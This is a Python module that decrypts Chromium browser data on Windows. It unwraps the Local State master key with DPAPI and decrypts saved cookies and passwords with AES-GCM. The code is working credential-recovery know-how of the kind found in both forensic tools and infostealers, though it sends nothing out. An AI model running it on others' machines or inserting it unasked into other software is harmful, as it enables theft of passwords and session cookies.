import os
import json
import base64
import sqlite3
import shutil
import logging
from datetime import datetime
import win32crypt # pip install pywin32
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger(__name__)

class BrowserDecryptor:
    """Handles decryption of browser data (cookies, passwords) on Windows."""
    
    @staticmethod
    def get_master_key(local_state_path):
        """
        Retrieves the master key from the browser's Local State file.
        This key is used to decrypt AES-GCM encrypted data (Chromium 80+).
        """
        if not os.path.exists(local_state_path):
            return None
            
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
                
            # Master key is base64 encoded and prefixed with 'DPAPI'
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            
            # Remove 'DPAPI' prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            
            # Decrypt using Windows DPAPI
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            logger.error(f"[Decryptor] Error getting master key from {local_state_path}: {e}")
            return None

    @staticmethod
    def decrypt_payload(payload, master_key):
        """
        Decrypts a payload using AES-GCM or DPAPI.
        
        Chromium 80+ uses AES-GCM with a prefix 'v10' or 'v11'.
        Older versions use DPAPI directly.
        """
        if not payload:
            return ""
            
        try:
            # Check for version prefix (v10 or v11 or v20)
            if payload[:3] in [b'v10', b'v11']:
                # For AES-GCM:
                iv = payload[3:15]
                ciphertext = payload[15:]
                
                aesgcm = AESGCM(master_key)
                decrypted = aesgcm.decrypt(iv, ciphertext, None)
                return decrypted.decode('utf-8')
            elif payload[:3] == b'v20':
                # v20 is Application Bound Encryption (App-Bound)
                # Decrypting this outside the browser process is complex
                return f"[App-Bound Encryption (v20) | Prefix: {payload[:5].hex()}]"
            else:
                # DPAPI blobs usually have a specific structure starting with 01000000...
                # If it's too short or doesn't look like DPAPI, don't try it
                if len(payload) < 16:
                    return f"[Non-Encrypted/Short Payload | Prefix: {payload.hex()}]"
                
                decrypted = win32crypt.CryptUnprotectData(payload, None, None, None, 0)[1]
                return decrypted.decode('utf-8')
        except Exception as e:
            # If decryption fails, it might be a binary blob we can't decode to string
            try:
                if payload[:3] in [b'v10', b'v11']:
                    iv = payload[3:15]
                    ciphertext = payload[15:]
                    aesgcm = AESGCM(master_key)
                    return aesgcm.decrypt(iv, ciphertext, None)
                elif payload[:3] == b'v20':
                    return f"[App-Bound Encryption (v20) | Prefix: {payload[:5].hex()}]"
                else:
                    if len(payload) < 16:
                        return f"[Malformatted Payload | Prefix: {payload.hex()}]"
                    return win32crypt.CryptUnprotectData(payload, None, None, None, 0)[1]
            except Exception as e2:
                prefix = payload[:5].hex() if isinstance(payload, bytes) else "non-bytes"
                error_msg = f"[Decryption Error: {e} | Prefix: {prefix}]"
                # If it's specifically Error 13, it's just invalid data for DPAPI
                if "The data is invalid" in str(e) or "(13," in str(e):
                    error_msg = f"[Invalid Decryption Payload | Prefix: {prefix}]"
                
                logger.error(error_msg)
                return error_msg

    @staticmethod
    def chrome_date_to_datetime(chrome_date):
        """Converts Chrome's microsecond timestamp to a readable datetime."""
        if chrome_date <= 0:
            return None
        try:
            # Chrome timestamp starts from 1601-01-01
            return datetime.fromtimestamp((chrome_date / 1000000) - 11644473600)
        except:
            return None
